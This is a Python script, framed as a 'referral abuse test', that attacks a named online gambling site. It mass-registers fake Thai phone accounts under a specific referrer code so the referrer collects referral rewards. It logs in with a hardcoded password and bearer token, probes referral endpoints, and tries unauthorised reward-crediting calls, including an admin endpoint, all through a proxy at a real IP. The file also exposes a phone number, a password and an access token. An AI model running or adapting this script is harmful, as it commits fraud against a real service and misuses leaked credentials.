#!/usr/bin/env python3

import requests
import json
import time
import random
import string
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
API_DOMAIN = "https://jklmn23456.com"
FRONTEND_DOMAIN = "https://pigslot.co"
REFERRAL_DOMAIN = "https://pigslot.invit"

# Referral Information
REFERRER_CODE = "PS663888386"
REFERRAL_LINK = "https://pigslot.invit"
REFERRER_PHONE = "0960422161"
REWARD_AMOUNT = 500  # THB per referral
MAX_REFERRALS = 10

# ZAP Proxy Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")
def print_critical(message): print(f"\033[1;41m[CRITICAL] {message}\033[0m")

class ReferralAbuseTest:
    def __init__(self):
        self.session = requests.Session()
        self.session.proxies = PROXIES
        self.session.verify = False
        self.created_accounts = []
        self.successful_referrals = []
        self.total_rewards_earned = 0
        
    def generate_fake_phone(self):
        """Generate fake Thai phone number"""
        # Thai mobile prefixes: 06, 08, 09
        prefix = random.choice(['06', '08', '09'])
        # Generate 8 remaining digits
        suffix = ''.join([str(random.randint(0, 9)) for _ in range(8)])
        return prefix + suffix
    
    def generate_fake_data(self):
        """Generate fake registration data"""
        phone = self.generate_fake_phone()
        password = ''.join(random.choices(string.digits, k=6))
        
        return {
            'phone': phone,
            'password': password,
            'username': phone,
            'referral_code': REFERRER_CODE
        }
    
    def register_with_referral(self, fake_data):
        """Register new account with referral code"""
        print_info(f"Registering fake account: {fake_data['phone']}")
        
        # Registration endpoints to try
        registration_endpoints = [
            f"{API_DOMAIN}/api/v1/auth/register",
            f"{API_DOMAIN}/api/v1/register",
            f"{API_DOMAIN}/api/register",
            f"{FRONTEND_DOMAIN}/api/register",
            f"{FRONTEND_DOMAIN}/register"
        ]
        
        registration_payloads = [
            {
                "phone": fake_data['phone'],
                "password": fake_data['password'],
                "referral_code": REFERRER_CODE
            },
            {
                "username": fake_data['phone'],
                "password": fake_data['password'],
                "referrer": REFERRER_CODE
            },
            {
                "mobile": fake_data['phone'],
                "pwd": fake_data['password'],
                "ref": REFERRER_CODE
            },
            {
                "phone_number": fake_data['phone'],
                "password": fake_data['password'],
                "invite_code": REFERRER_CODE
            }
        ]
        
        session = requests.Session()
        session.proxies = PROXIES
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': FRONTEND_DOMAIN,
            'Referer': f'{REFERRAL_LINK}?ref={REFERRER_CODE}'
        })
        
        for endpoint in registration_endpoints:
            for payload in registration_payloads:
                try:
                    response = session.post(endpoint, json=payload, timeout=15, verify=False)
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if data.get('status') == 'SUCCESS' or 'success' in str(data).lower():
                                print_success(f"✅ Registration successful: {fake_data['phone']}")
                                print_success(f"   Endpoint: {endpoint}")
                                print_success(f"   Response: {data}")
                                
                                fake_data['registration_response'] = data
                                fake_data['registration_endpoint'] = endpoint
                                return True, data
                        except:
                            # Check for HTML success indicators
                            if 'success' in response.text.lower() or 'welcome' in response.text.lower():
                                print_success(f"✅ Registration may be successful: {fake_data['phone']}")
                                return True, {'status': 'SUCCESS', 'message': 'HTML registration'}
                                
                except Exception as e:
                    continue
        
        print_error(f"❌ Registration failed: {fake_data['phone']}")
        return False, None
    
    def check_referral_reward(self, referrer_phone=REFERRER_PHONE):
        """Check if referral reward was credited"""
        print_info(f"Checking referral rewards for: {referrer_phone}")
        
        # Login as referrer to check balance
        login_endpoints = [
            f"{API_DOMAIN}/api/v1/auth/login",
            f"{API_DOMAIN}/api/login"
        ]
        
        login_data = {
            "username": referrer_phone,
            "password": "181242"
        }
        
        session = requests.Session()
        session.proxies = PROXIES
        
        for endpoint in login_endpoints:
            try:
                response = session.post(endpoint, json=login_data, timeout=15, verify=False)
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('status') == 'SUCCESS':
                        token = data.get('data', {}).get('access_token')
                        if token:
                            session.headers.update({'Authorization': f'bearer {token}'})
                            
                            # Check balance/wallet
                            balance_endpoints = [
                                f"{API_DOMAIN}/api/v1/wallet/balance",
                                f"{API_DOMAIN}/api/v1/user/balance",
                                f"{API_DOMAIN}/api/v1/account/balance"
                            ]
                            
                            for balance_endpoint in balance_endpoints:
                                try:
                                    balance_response = session.get(balance_endpoint, timeout=10, verify=False)
                                    if balance_response.status_code == 200:
                                        balance_data = balance_response.json()
                                        print_info(f"Balance check: {balance_data}")
                                        return balance_data
                                except:
                                    continue
            except:
                continue
        
        return None
    
    def test_referral_system_abuse(self):
        """Test referral system abuse by creating multiple fake accounts"""
        print_critical("🎯 TESTING REFERRAL SYSTEM ABUSE")
        print_critical("=" * 60)
        print_info(f"Referrer Code: {REFERRER_CODE}")
        print_info(f"Referral Link: {REFERRAL_LINK}")
        print_info(f"Expected Reward: {REWARD_AMOUNT} THB per referral")
        print_info(f"Maximum Referrals: {MAX_REFERRALS}")
        print_info("")
        
        # Check initial balance
        initial_balance = self.check_referral_reward()
        print_info(f"Initial balance check: {initial_balance}")
        
        successful_registrations = 0
        
        # Create fake accounts
        for i in range(MAX_REFERRALS):
            print_info(f"\n--- Creating fake account {i+1}/{MAX_REFERRALS} ---")
            
            fake_data = self.generate_fake_data()
            success, response_data = self.register_with_referral(fake_data)
            
            if success:
                successful_registrations += 1
                fake_data['success'] = True
                fake_data['response'] = response_data
                self.created_accounts.append(fake_data)
                self.successful_referrals.append(fake_data['phone'])
                
                # Check if reward was credited immediately
                print_info("Checking for immediate reward...")
                time.sleep(2)  # Wait a bit for system to process
                
                current_balance = self.check_referral_reward()
                if current_balance:
                    print_success(f"Balance after referral {i+1}: {current_balance}")
            
            time.sleep(1)  # Rate limiting
        
        # Final balance check
        print_info("\n" + "="*60)
        print_info("FINAL BALANCE CHECK")
        print_info("="*60)
        
        final_balance = self.check_referral_reward()
        print_success(f"Final balance: {final_balance}")
        
        # Calculate potential abuse
        potential_earnings = successful_registrations * REWARD_AMOUNT
        print_critical(f"Successful fake registrations: {successful_registrations}")
        print_critical(f"Potential fraudulent earnings: {potential_earnings} THB")
        
        return successful_registrations, potential_earnings
    
    def test_referral_endpoints_discovery(self):
        """Discover referral-related endpoints"""
        print_info("🔍 Discovering referral endpoints...")
        
        referral_endpoints = [
            f"{API_DOMAIN}/api/v1/referral/info",
            f"{API_DOMAIN}/api/v1/referral/stats",
            f"{API_DOMAIN}/api/v1/referral/list",
            f"{API_DOMAIN}/api/v1/referral/rewards",
            f"{API_DOMAIN}/api/v1/invite/info",
            f"{API_DOMAIN}/api/v1/invite/stats",
            f"{API_DOMAIN}/api/v1/user/referrals",
            f"{API_DOMAIN}/api/v1/user/invites",
            f"{API_DOMAIN}/api/v1/loyalty/referral",
            f"{FRONTEND_DOMAIN}/api/referral",
            f"{FRONTEND_DOMAIN}/api/invite"
        ]
        
        session = requests.Session()
        session.proxies = PROXIES
        # Add referrer token if available
        session.headers.update({
            'Authorization': f'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTYyODE3NTAsInBob25lX251bWJlciI6IjA5NjA0MjIxNjEiLCJ1c2VyX3VpZCI6ImRjZmQ0MzI0LWJjMjMtNDQ1OS1hMjE0LTA3Yjg0NWIwZmZiMiIsImN1c3RvbWVyX2NvZGUiOiJQUzY2Mzg4ODM4NiIsImdhbWVfdG9rZW4iOiJnYW1lLTM4NTc1ZjQ0LTEwMjUtNDA1Yi04MjY2LTRiODI3OGMwZDc4NCJ9.IyZ8E-6rBsH7S1fqpMwrMYWoI8pVuB2Z3bXvE0F7Ndw'
        })
        
        discovered_endpoints = []
        
        for endpoint in referral_endpoints:
            try:
                response = session.get(endpoint, timeout=10, verify=False)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        print_success(f"✅ Referral endpoint found: {endpoint}")
                        print_success(f"   Response: {str(data)[:200]}...")
                        discovered_endpoints.append({
                            'url': endpoint,
                            'data': data
                        })
                    except:
                        if len(response.text) > 100:
                            print_success(f"✅ Referral endpoint found (HTML): {endpoint}")
                            discovered_endpoints.append({
                                'url': endpoint,
                                'data': 'HTML_RESPONSE'
                            })
            except:
                continue
        
        return discovered_endpoints
    
    def test_reward_manipulation(self):
        """Test direct reward manipulation"""
        print_info("💰 Testing reward manipulation...")
        
        manipulation_endpoints = [
            f"{API_DOMAIN}/api/v1/referral/reward/add",
            f"{API_DOMAIN}/api/v1/referral/bonus",
            f"{API_DOMAIN}/api/v1/invite/reward",
            f"{API_DOMAIN}/api/v1/wallet/referral/add",
            f"{API_DOMAIN}/api/v1/admin/referral/reward"
        ]
        
        reward_payloads = [
            {"amount": REWARD_AMOUNT, "type": "referral"},
            {"reward": REWARD_AMOUNT, "referral_code": REFERRER_CODE},
            {"bonus": REWARD_AMOUNT, "reason": "referral_bonus"},
            {"referral_reward": REWARD_AMOUNT}
        ]
        
        session = requests.Session()
        session.proxies = PROXIES
        session.headers.update({
            'Authorization': f'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
            'Content-Type': 'application/json'
        })
        
        successful_manipulations = []
        
        for endpoint in manipulation_endpoints:
            for payload in reward_payloads:
                try:
                    response = session.post(endpoint, json=payload, timeout=10, verify=False)
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if data.get('status') == 'SUCCESS':
                                print_critical(f"🚨 REWARD MANIPULATION SUCCESSFUL!")
                                print_critical(f"   Endpoint: {endpoint}")
                                print_critical(f"   Payload: {payload}")
                                print_critical(f"   Response: {data}")
                                successful_manipulations.append({
                                    'endpoint': endpoint,
                                    'payload': payload,
                                    'response': data
                                })
                        except:
                            pass
                except:
                    continue
        
        return successful_manipulations
    
    def generate_abuse_report(self, registrations, earnings, discovered_endpoints, manipulations):
        """Generate comprehensive abuse report"""
        
        severity = "LOW"
        if registrations > 0:
            severity = "MEDIUM"
        if earnings > 1000:
            severity = "HIGH"
        if manipulations:
            severity = "CRITICAL"
        
        report = f"""
🚨 REFERRAL SYSTEM ABUSE VULNERABILITY REPORT
============================================

Target: {FRONTEND_DOMAIN}
Test Date: {time.strftime('%Y-%m-%d %H:%M:%S')}
Vulnerability: Referral System Abuse / Reward Manipulation

💥 EXECUTIVE SUMMARY:
===================
Severity: {severity}
Fake Accounts Created: {registrations}
Potential Fraudulent Earnings: {earnings} THB
Discovered Endpoints: {len(discovered_endpoints)}
Direct Manipulations: {len(manipulations)}

🎯 VULNERABILITY DETAILS:
========================

Referral Information:
- Referrer Code: {REFERRER_CODE}
- Referral Link: {REFERRAL_LINK}
- Reward per Referral: {REWARD_AMOUNT} THB
- Maximum Referrals: {MAX_REFERRALS}

🔍 ATTACK RESULTS:
=================

1. FAKE ACCOUNT CREATION:
   Success Rate: {registrations}/{MAX_REFERRALS} ({(registrations/MAX_REFERRALS)*100:.1f}%)
   
   Created Accounts:
"""
        
        for account in self.created_accounts:
            report += f"   - {account['phone']} (Password: {account['password']})\n"
        
        report += f"""
2. DISCOVERED ENDPOINTS:
"""
        
        for endpoint in discovered_endpoints:
            report += f"   - {endpoint['url']}\n"
        
        report += f"""
3. REWARD MANIPULATIONS:
"""
        
        if manipulations:
            for manip in manipulations:
                report += f"   - {manip['endpoint']}: SUCCESS\n"
        else:
            report += "   - No successful manipulations\n"
        
        report += f"""
⚠️ IMPACT ASSESSMENT:
====================

Financial Impact: {earnings} THB potential loss
Risk Level: {severity}

This vulnerability allows:
- Creation of fake accounts for referral abuse
- Potential financial loss through fraudulent rewards
- Damage to referral program integrity
- System resource waste

🛡️ REMEDIATION:
===============

1. Implement phone number verification (SMS OTP)
2. Add identity verification for rewards
3. Rate limiting on account creation
4. Device fingerprinting to detect fake accounts
5. Manual review for suspicious referral patterns
6. Implement CAPTCHA on registration
7. Monitor for bulk account creation

🔥 PROOF OF CONCEPT:
===================

The following fake accounts were created successfully:
{json.dumps(self.successful_referrals, indent=2)}

Expected total fraudulent earnings: {earnings} THB

⚠️ This represents a {severity.lower()} risk to the referral system integrity.
"""
        
        return report

def main():
    print_critical("🎯 REFERRAL SYSTEM ABUSE TESTING SUITE")
    print_critical("=" * 70)
    
    tester = ReferralAbuseTest()
    
    # Phase 1: Discover referral endpoints
    print_info("Phase 1: Discovering referral endpoints...")
    discovered_endpoints = tester.test_referral_endpoints_discovery()
    
    # Phase 2: Test direct reward manipulation
    print_info("\nPhase 2: Testing reward manipulation...")
    manipulations = tester.test_reward_manipulation()
    
    # Phase 3: Test referral abuse with fake accounts
    print_info("\nPhase 3: Testing referral abuse...")
    registrations, earnings = tester.test_referral_system_abuse()
    
    # Phase 4: Generate report
    print_info("\nPhase 4: Generating abuse report...")
    report = tester.generate_abuse_report(registrations, earnings, discovered_endpoints, manipulations)
    
    # Save report
    with open('REFERRAL_ABUSE_REPORT.txt', 'w', encoding='utf-8') as f:
        f.write(report)
    
    # Display results
    print_info("\n" + "=" * 70)
    print_critical("🎯 REFERRAL ABUSE TEST RESULTS")
    print_critical("=" * 70)
    
    if registrations > 0:
        print_critical(f"✅ VULNERABILITY CONFIRMED!")
        print_critical(f"✅ {registrations} fake accounts created successfully")
        print_critical(f"✅ Potential loss: {earnings} THB")
    else:
        print_info("❌ No fake accounts created - system may be protected")
    
    if discovered_endpoints:
        print_success(f"✅ {len(discovered_endpoints)} referral endpoints discovered")
    
    if manipulations:
        print_critical(f"🚨 {len(manipulations)} direct reward manipulations successful!")
    
    print_success(f"\n📄 Detailed report saved to: REFERRAL_ABUSE_REPORT.txt")
    
    # Severity assessment
    if manipulations:
        severity = "CRITICAL"
    elif earnings > 1000:
        severity = "HIGH" 
    elif registrations > 0:
        severity = "MEDIUM"
    else:
        severity = "LOW"
    
    print_critical(f"\n🎯 FINAL ASSESSMENT: {severity} RISK")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()